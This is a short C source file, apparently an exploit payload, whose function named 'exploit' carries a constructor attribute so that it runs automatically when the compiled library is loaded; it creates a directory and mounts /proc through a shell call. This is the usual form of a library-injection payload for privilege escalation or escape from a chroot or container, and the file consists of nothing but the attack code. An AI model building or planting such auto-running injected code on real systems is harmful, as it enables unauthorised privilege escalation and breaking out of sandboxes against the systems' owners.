#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
void __attribute__((constructor)) exploit(){
    mkdir("AAAAAA", 0755);
    system("mount -t proc proc /proc");
    return;
}